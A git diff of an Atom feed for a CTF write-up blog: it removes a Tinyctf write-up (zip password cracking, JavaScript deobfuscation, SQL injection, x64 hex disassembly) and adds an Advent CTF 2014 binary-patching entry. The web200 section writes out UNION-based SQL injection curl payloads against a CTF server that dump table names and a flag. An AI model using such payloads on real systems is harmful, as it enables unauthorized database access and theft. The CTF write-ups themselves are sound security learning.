@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Ctf | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2014-12-11T19:45:20+01:00</updated>
+  <updated>2014-12-24T12:12:27+01:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -14,481 +14,786 @@
 
   
   <entry>
-    <title type="html"><![CDATA[Tinyctf Writeup]]></title>
-    <link href="http://barrebas.github.io/blog/2014/10/03/tinyctf/"/>
-    <updated>2014-10-03T19:25:41+02:00</updated>
-    <id>http://barrebas.github.io/blog/2014/10/03/tinyctf</id>
-    <content type="html"><![CDATA[<p><code>tinyctf</code> was ran by @balidani and was actually a very enjoyable Jeopardy-style CTF event! I spent quite some time on the challenges and got all flags except crypto200. I kept some notes in <code>keepnote</code> which I converted to this blog post. The name of each challenge was a hint for solving the challenge. The author hinted at a VM containing all the challenges, so keep you eyes peeled for that one.</p>
-
-<!--more-->
-
-
-<h1>misc50</h1>
-
-<p>Clearly, this was <code>brainfuck</code> code! Yay for <code>brainfuck</code>! Unfortunately, this being a CTF, I quickly entered the bf code in an online interpreter, got the flag and did not keep any notes. But yay for <code>bf</code>!</p>
-
-<h1>misc100 aka Janos the Ripper</h1>
-
-<p>The zip file contained a second zip file with a password-protected file called &lsquo;flag&rsquo;. The name of course hinted strongly in the direction of John the Ripper and indeed, JtR made quick work of this password-protected zip file:</p>
+    <title type="html"><![CDATA[Advent CTF 2014 - Bruteforce]]></title>
+    <link href="http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-bruteforce/"/>
+    <updated>2014-12-24T11:38:35+01:00</updated>
+    <id>http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-bruteforce</id>
+    <content type="html"><![CDATA[<p>Bruteforce they said, it&rsquo;ll be fun, they said&hellip;</p>
 
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tools/john-1.7.9-jumbo-7/run<span class="nv">$ </span>./zip2john ~/tmp/misc100 &gt; misc100.hashes
-/home/bas/tmp/misc100-&gt;flag.txt PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>39, <span class="nv">decmplen</span><span class="o">=</span>25, <span class="nv">crc</span><span class="o">=</span>7788D444
-bas@tritonal:~/tools/john-1.7.9-jumbo-7/run<span class="nv">$ </span>./john ./misc100.hashes
-Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64<span class="o">])</span>
-fish             <span class="o">(</span>/home/bas/tmp/misc100<span class="o">)</span>
-guesses: <span class="m">1</span>  <span class="nb">time</span>: 0:00:00:00 DONE <span class="o">(</span>Mon Sep <span class="m">29</span> 22:14:44 2014<span class="o">)</span>  c/s: <span class="m">388328</span>  trying: marisol - <span class="nb">help</span>
-Use the <span class="p">&amp;</span>ldquo<span class="p">;&amp;</span>ndash<span class="p">;</span>show<span class="p">&amp;</span>rdquo<span class="p">;</span> option to display all of the cracked passwords reliably</code></pre></div></p>
+<!-- more -->
 
-<p><code>flag{ev3n::y0u::bru7us?!}</code></p>
 
-<h1>web100</h1>
+<p>We&rsquo;re given only a binary and are told that we shouldn&rsquo;t bruteforce the server. The binary, when started, only says &ldquo;calculating&hellip;..&rdquo; and not much else. Upon closer examination, I found that it does some calculations and checks a certain number before printing out the flag:</p>
 
-<p>This challenge presents us again with a file to download, which turns out to be a heavily obfuscated <code>javascript</code> file. Between the javascript statements are strange bytes values, such as <code>0x02</code> or <code>0x01</code>. These are not visible in the code below.</p>
+<pre><code>   0x400703:    movsxd rax,DWORD PTR [rsp+0x8]
+=&gt; 0x400708:    cmp    rax,QWORD PTR [rip+0x200969]        # 0x601078
+   0x40070f:    je     0x400780
+   0x400711:    add    DWORD PTR [rsp+0xc],0x1
+</code></pre>
 
-<p><div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;/p&gt;</span>
+<p>If <code>eax</code> matches the value at <code>0x601078</code>, then the code jumps here:</p>
 
-<span class="nt">&lt;script&gt;</span><span class="nx">_</span><span class="o">=</span><span class="s1">&#39;function $(){e=getEleById(&quot;c&quot;).value;length==16^be0f23233ace98aa$c7be9){tfls_aie}na_h0lnrg{e_0iit\&#39;_ns=[t,n,r,i];for(o=0;o&lt;13;++o){  [0]);.splice(0,1)}}}    \&#39;&lt;input id=&quot;c&quot;&gt;&lt; onclick=$()&gt;Ok&lt;/&gt;\&#39;);delete _var &quot;,&quot;docu.)match(/&quot;];/)!=null=[&quot;   write(s[o%4]buttonif(e.ment&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nx">Y</span> <span class="k">in</span> <span class="nx">$</span><span class="o">=</span><span class="s1">&#39;   &#39;</span><span class="p">)</span><span class="kd">with</span><span class="p">(</span><span class="nx">_</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="nx">$</span><span class="p">[</span><span class="nx">Y</span><span class="p">]))</span><span class="nx">_</span><span class="o">=</span><span class="nx">join</span><span class="p">(</span><span class="nx">pop</span><span class="p">());</span><span class="nb">eval</span><span class="p">(</span><span class="nx">_</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+<pre><code>  400780:   8b 54 24 0c             mov    edx,DWORD PTR [rsp+0xc]
+  400784:   be b1 09 40 00          mov    esi,0x4009b1 ; bruteforce : 0x4009b1 ("the flag is: ADCTF_%d\n")
+  400789:   bf 01 00 00 00          mov    edi,0x1
+  40078e:   31 c0                   xor    eax,eax
+  400790:   e8 7b fe ff ff          call   400610 &lt;__printf_chk@plt&gt;
+</code></pre>
+
+<p>So the calculates until a certain value is found and then dumps the flag. I found a couple of rate-limiting things, such as these syscalls:</p>
 
+<pre><code>  4008e0:   49 89 ce                mov    r14,rcx
+  4008e3:   48 89 fa                mov    rdx,rdi
+  4008e6:   4c 89 d7                mov    rdi,r10
+  4008e9:   4c 89 ce                mov    rsi,r9
+  4008ec:   48 31 c0                xor    rax,rax
+  4008ef:   b0 23                   mov    al,0x23  ; nanosleep
+  4008f1:   0f 05                   syscall 
+</code></pre>
 
-<span class="nt">&lt;p&gt;</span></code></pre></div></p>
+<p>I didn&rsquo;t want to slow it down so I nop&#8217;ed out three of those syscalls, along with the calls to putchar and printf. I ran the binary, occasionaly checking at which it was&hellip; but it still was very slow! Time for a different approach&hellip;</p>
 
-<p>I had little luck trying to reverse this javascript. I noticed that the entire string is parsed with <code>eval</code> so I just replaced it with <code>alert</code> and ran the javascript. I was presented with the following code, after pulling it through <a href="http://jsbeautifier.org/">jsbeautifier.org</a>:</p>
+<p>Running the binary and breaking at the comparison at <code>0x400708</code>, I compared the value at <code>rsp+0x8</code> and <code>rsp+0xc</code> (which is used to print out the flag eventually). I noticed these numbers:</p>
 
-<p><div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">$</span><span class="p">()</span> <span class="p">{</span>
-    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">c</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;).</span><span class="nx">value</span><span class="p">;</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">16</span><span class="p">)</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^be0f23/</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span>
-            <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/233ac/</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span>
-                <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/e98aa$/</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span>
-                    <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/c7be9/</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
-                        <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">fl</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">s_a</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">i</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">e</span><span class="p">}</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;];</span>
-                        <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">h0l</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">n</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;];</span>
-                        <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">g</span><span class="p">{</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">e</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&lt;</span><span class="err">/em&gt;0&amp;rdquo;];</span>
-                        <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">it</span><span class="err">&#39;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">_</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">n</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;];</span>
-                        <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="p">[</span><span class="nx">t</span><span class="p">,</span> <span class="nx">n</span><span class="p">,</span> <span class="nx">r</span><span class="p">,</span> <span class="nx">i</span><span class="p">];</span>
-                        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">o</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">13</span><span class="p">;</span> <span class="o">++</span><span class="nx">o</span><span class="p">)</span> <span class="p">{</span>
-                            <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">s</span><span class="p">[</span><span class="nx">o</span> <span class="o">%</span> <span class="mi">4</span><span class="p">][</span><span class="mi">0</span><span class="p">]);</span>
-                            <span class="nx">s</span><span class="p">[</span><span class="nx">o</span> <span class="o">%</span> <span class="mi">4</span><span class="p">].</span><span class="nx">splice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
-                        <span class="p">}</span>
-                    <span class="p">}</span>
-<span class="p">}</span>
-<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&quot;c&quot;</span><span class="o">&gt;&lt;</span><span class="nx">button</span> <span class="nx">onclick</span><span class="o">=</span><span class="nx">$</span><span class="p">()</span><span class="o">&gt;</span><span class="nx">Ok</span><span class="o">&lt;</span><span class="err">/button&gt;&amp;rsquo;);</span>
-<span class="k">delete</span> <span class="nx">_</span></code></pre></div></p>
-
-<p>So the original javascript replaces all the weird bytes and then runs this code, which obviously checks the input. If it is valid, it will unmangle the flag. I was not able to get the proper string, but who cares when I can just run:</p>
-
-<p><div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;/p&gt;</span>
+<pre><code>rsp+0x8     rsp+0xc
+-------------------
+    1           1
+    2           2
+    3           5
+    4           7
+    5           11
+</code></pre>
 
-<span class="nt">&lt;script&gt;</span><span class="kd">function</span> <span class="nx">$</span><span class="p">()</span> <span class="p">{</span>
-                        <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;fl&quot;</span><span class="p">,</span> <span class="s2">&quot;s_a&quot;</span><span class="p">,</span> <span class="s2">&quot;i&quot;</span><span class="p">,</span> <span class="s2">&quot;e}&quot;</span><span class="p">];</span>
-                        <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="s2">&quot;_h0l&quot;</span><span class="p">,</span> <span class="s2">&quot;n&quot;</span><span class="p">];</span>
-                        <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;g{&quot;</span><span class="p">,</span> <span class="s2">&quot;e&quot;</span><span class="p">,</span> <span class="s2">&quot;_0&quot;</span><span class="p">];</span>
-                        <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;it&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;_&quot;</span><span class="p">,</span> <span class="s2">&quot;n&quot;</span><span class="p">];</span>
-                        <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="p">[</span><span class="nx">t</span><span class="p">,</span> <span class="nx">n</span><span class="p">,</span> <span class="nx">r</span><span class="p">,</span> <span class="nx">i</span><span class="p">];</span>
-                        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">o</span> <span class="o">&lt;</span> <span class="mi">13</span><span class="p">;</span> <span class="o">++</span><span class="nx">o</span><span class="p">)</span> <span class="p">{</span>
-                            <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">s</span><span class="p">[</span><span class="nx">o</span> <span class="o">%</span> <span class="mi">4</span><span class="p">][</span><span class="mi">0</span><span class="p">]);</span>
-                            <span class="nx">s</span><span class="p">[</span><span class="nx">o</span> <span class="o">%</span> <span class="mi">4</span><span class="p">].</span><span class="nx">splice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
-                        <span class="p">}</span>
-<span class="p">}</span>
-<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#39;</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
-
-
-<span class="nt">&lt;p&gt;</span></code></pre></div></p>
-
-<p><code>flag{it's_a_h0le_in_0ne}</code></p>
-
-<h1>web200</h1>
-
-<p>This was a fun one. We&rsquo;re presented with a webpage about rollercoasters and a search box. We can search for values in the name, park or country. This smells like SQLi. I tried a couple of things in the search box, but this got me nowhere. I viewed the source of the webpage and lo-and-behold: it looks like we can specify the column name to be searched ourselves! I switched over to <code>curl</code> to check this. After a bit of fumbling around for the proper syntax, I came up with this:</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>curl -v <span class="p">&amp;</span>ldquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://54.69.118.120:8000/index.php&quot;</span>&gt;http://54.69.118.120:8000/index.php&lt;/a&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>data <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">value</span><span class="o">=</span>999<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">column</span><span class="o">=</span>height <span class="p">&amp;</span>lt<span class="p">;</span> <span class="m">0</span> union <span class="k">select</span> 1,2,3,4 <span class="p">&amp;</span>ndash<span class="p">;</span> <span class="c">#&amp;rdquo;</span>
-* About to connect<span class="o">()</span> to 54.69.118.120 port <span class="m">8000</span> <span class="o">(</span><span class="c">#0)</span>
-*   Trying 54.69.118.120<span class="p">&amp;</span>hellip<span class="p">;</span>
-* connected
-<span class="p">&amp;</span>hellip<span class="p">;</span>snip<span class="p">&amp;</span>hellip<span class="p">;</span>
-        &lt;div <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;content&quot;</span> <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;whitebox&quot;</span>&gt;
-            &lt;table&gt;
-                &lt;tr&gt;
-                    &lt;th&gt;
-                        Name
-                    &lt;/th&gt;
-                    &lt;th&gt;
-                        Park
-                    &lt;/th&gt;
-                    &lt;th&gt;
-                        Country
-                    &lt;/th&gt;
-                    &lt;th&gt;
-                        Height
-                    &lt;/th&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;            <span class="p">&amp;</span>lt<span class="p">;</span>/tr<span class="p">&amp;</span>gt<span class="p">;&amp;</span>lt<span class="p">;</span>tr<span class="p">&amp;</span>gt<span class="p">;&amp;</span>lt<span class="p">;</span>td<span class="p">&amp;</span>gt<span class="p">;</span>1<span class="p">&amp;</span>lt<span class="p">;</span>/td<span class="p">&amp;</span>gt<span class="p">;&amp;</span>lt<span class="p">;</span>td<span class="p">&amp;</span>gt<span class="p">;</span>2<span class="p">&amp;</span>lt<span class="p">;</span>/td<span class="p">&amp;</span>gt<span class="p">;&amp;</span>lt<span class="p">;</span>td<span class="p">&amp;</span>gt<span class="p">;</span>3<span class="p">&amp;</span>lt<span class="p">;</span>/td<span class="p">&amp;</span>gt<span class="p">;&amp;</span>lt<span class="p">;</span>td<span class="p">&amp;</span>gt<span class="p">;</span><span class="m">4</span> m<span class="p">&amp;</span>lt<span class="p">;</span>/td<span class="p">&amp;</span>gt<span class="p">;&amp;</span>lt<span class="p">;</span>/tr<span class="p">&amp;</span>gt<span class="p">;&amp;</span>lt<span class="p">;</span>/table<span class="p">&amp;</span>gt<span class="p">;</span>
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;<span class="p">&amp;</span>hellip<span class="p">;</span>snip<span class="p">&amp;</span>hellip<span class="p">;</span></code></pre></div></p>
-
-<p>You can see that the webpage nicely returns the values 1, 2, 3 and 4, verifying a SQL injection. Next, I assumed MySQL and grabbed the table names:</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>curl -v <span class="p">&amp;</span>ldquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://54.69.118.120:8000/index.php&quot;</span>&gt;http://54.69.118.120:8000/index.php&lt;/a&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>data <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">value</span><span class="o">=</span>999<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">column</span><span class="o">=</span>height <span class="p">&amp;</span>lt<span class="p">;</span> <span class="m">0</span> union <span class="k">select</span> 1,2,table_name,0 from information_schema.tables <span class="p">&amp;</span>ndash<span class="p">;</span> <span class="c">#&amp;rdquo;</span>
-<span class="p">&amp;</span>hellip<span class="p">;</span>snip<span class="p">&amp;</span>hellip<span class="p">;</span>
-&lt;td&gt;setup_timers&lt;/td&gt;&lt;td&gt;0 m&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;threads&lt;/td&gt;&lt;td&gt;0 m&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;flag&lt;/td&gt;&lt;td&gt;0 m&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;rollercoaster&lt;/td&gt;&lt;td&gt;0 m&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-<span class="p">&amp;</span>hellip<span class="p">;</span>snip<span class="p">&amp;</span>hellip<span class="p">;</span></code></pre></div></p>
-
-<p>Looks like there is a table named <code>flag</code>! Let&rsquo;s grab column names:</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>curl -v <span class="p">&amp;</span>ldquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://54.69.118.120:8000/index.php&quot;</span>&gt;http://54.69.118.120:8000/index.php&lt;/a&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>data <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">value</span><span class="o">=</span>999<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">column</span><span class="o">=</span>height <span class="p">&amp;</span>lt<span class="p">;</span> <span class="m">0</span> union <span class="k">select</span> 1,2,column_name,0 from information_schema.columns where <span class="nv">table_name</span> <span class="o">=</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>flag<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span> <span class="c">#&amp;rdquo;</span></code></pre></div></p>
-
-<p>This returned the column <code>hash</code>. Get the flag!</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>curl -v <span class="p">&amp;</span>ldquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://54.69.118.120:8000/index.php&quot;</span>&gt;http://54.69.118.120:8000/index.php&lt;/a&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>data <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">value</span><span class="o">=</span>999<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">column</span><span class="o">=</span>height <span class="p">&amp;</span>lt<span class="p">;</span> <span class="m">0</span> union <span class="k">select</span> 1,2,hash,0 from flag <span class="p">&amp;</span>ndash<span class="p">;</span> <span class="c">#&amp;rdquo;</span></code></pre></div></p>
-
-<p><code>flag{unroll_those_loops}</code></p>
-
-<h1>rev100</h1>
-
-<p>Unpacking the zip file gave me a file that looked like the output of <code>xxd</code>:</p>
-
-<p><div class="highlight"><pre><code class="language-diff" data-lang="diff">00400080  68 66 6C 00 00 48 BF 01  00 00 00 00 00 00 00 48
-00400090  8D 34 24 48 BA 02 00 00  00 00 00 00 00 48 B8 01
-004000A0  00 00 00 00 00 00 00 0F  05 68 61 67 00 00 48 BF
-004000B0  01 00 00 00 00 00 00 00  48 8D 34 24 48 BA 02 00
-004000C0  00 00 00 00 00 00 48 B8  01 00 00 00 00 00 00 00
-004000D0  0F 05 68 7B 70 00 00 48  BF 01 00 00 00 00 00 00
-004000E0  00 48 8D 34 24 48 BA 02  00 00 00 00 00 00 00 48
-004000F0  B8 01 00 00 00 00 00 00  00 0F 05 68 6F 70 00 00
-00400100  48 BF 01 00 00 00 00 00  00 00 48 8D 34 24 48 BA
-00400110  02 00 00 00 00 00 00 00  48 B8 01 00 00 00 00 00
-00400120  00 00 0F 05 68 70 6F 00  00 48 BF 01 00 00 00 00
-00400130  00 00 00 48 8D 34 24 48  BA 02 00 00 00 00 00 00
-00400140  00 48 B8 01 00 00 00 00  00 00 00 0F 05 68 70 72
-00400150  00 00 48 BF 01 00 00 00  00 00 00 00 48 8D 34 24
-00400160  48 BA 02 00 00 00 00 00  00 00 48 B8 01 00 00 00
-00400170  00 00 00 00 0F 05 68 65  74 00 00 48 BF 01 00 00
-00400180  00 00 00 00 00 48 8D 34  24 48 BA 02 00 00 00 00
-00400190  00 00 00 48 B8 01 00 00  00 00 00 00 00 0F 05 68
-004001A0  7D 0A 00 00 48 BF 01 00  00 00 00 00 00 00 48 8D
-004001B0  34 24 48 BA 02 00 00 00  00 00 00 00 48 B8 01 00
-004001C0  00 00 00 00 00 00 0F 05  48 31 FF 48 B8 3C 00 00
-004001D0  00 00 00 00 00 0F 05</code></pre></div></p>
-
-<p>Reversing the process with <code>xxd -r</code> gave me a 4 MB file which didn&rsquo;t really help much. Instead, looking at the address and bytes, I somehow got the feeling this was assembly code. So I extracted all the bytes with some quick &amp; dirty bash-fu (&lsquo;cause ctf):</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">cat rev100 <span class="p">|</span>awk <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="o">{</span>print <span class="nv">$2$3$4$5$6$7$8$9$10$11$12$13$14$15$16$17</span><span class="o">}</span><span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">|</span> tr -d <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="se">\r\n</span><span class="p">&amp;</span>rsquo<span class="p">;</span>
-68666C000048BF0100000000000000488D342448BA020000000000000048B80<span class="p">&amp;</span>hellip<span class="p">;</span>snip<span class="p">&amp;</span>hellip<span class="p">;</span></code></pre></div></p>
-
-<p>Now <code>radare2</code> comes to the rescue again! Notice the <code>-b 64</code> flag to specify x64 code.</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>rasm2 -b <span class="m">64</span> -d <span class="p">&amp;</span>ldquo<span class="p">;</span>68666C000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05686167000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05687B70000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05686F70000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F0568706F000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05687072000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05686574000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05687D0A000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F054831FF48B83C000000000000000F05<span class="p">&amp;</span>rdquo<span class="p">;</span>
-push dword 0x6c66
-mov rdi, 0x1
-lea rsi, <span class="o">[</span>rsp<span class="o">]</span>
-mov rdx, 0x2
-mov rax, 0x1
-syscall
-push dword 0x6761
-mov rdi, 0x1
-lea rsi, <span class="o">[</span>rsp<span class="o">]</span>
-mov rdx, 0x2
-mov rax, 0x1
-syscall
-..snip<span class="p">&amp;</span>hellip<span class="p">;</span>
-push dword 0xa7d
-mov rdi, 0x1
-lea rsi, <span class="o">[</span>rsp<span class="o">]</span>
-mov rdx, 0x2
-mov rax, 0x1
-syscall
-xor rdi, rdi
-mov rax, 0x3c
-syscall</code></pre></div></p>
-
-<p>Looks like it wants to use syscall to print characters to the screen. Instead, I extract the values:</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp<span class="nv">$ </span>rasm2 -b <span class="m">64</span> -d <span class="p">&amp;</span>ldquo<span class="p">;</span>68666C000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05686167000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05687B70000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05686F70000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F0568706F000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05687072000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05686574000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F05687D0A000048BF0100000000000000488D342448BA020000000000000048B801000000000000000F054831FF48B83C000000000000000F05<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">|</span> grep <span class="p">&amp;</span>ldquo<span class="p">;</span>push dword<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">|</span>awk <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="o">{</span>print <span class="nv">$3</span><span class="o">}</span><span class="p">&amp;</span>rsquo<span class="p">;</span>
-0x6c66
-0x6761
-0x707b
-0x706f
-0x6f70
-0x7270
-0x7465
-0xa7d</code></pre></div></p>
-
-<p><code>xxd -p -r</code> helps to read these bytes.</p>
-
-<p><code>flag{poppopret}</code></p>
-
-<h1>rev200</h1>
-
-<p>This was an annoying challenge. I sort of knew what to do, but couldn&rsquo;t get the proper tools running. The zip file seems to contain an APK file. I tried to run it in an emulator, but did not succeed. I tried four different disassembler and struck gold with <a href="http://code.google.com/p/android-apktool">android-apktool</a>. This tool could disassemble the APK file:</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">java -jar apktool.jar -d ./rev200.apk</code></pre></div></p>
-
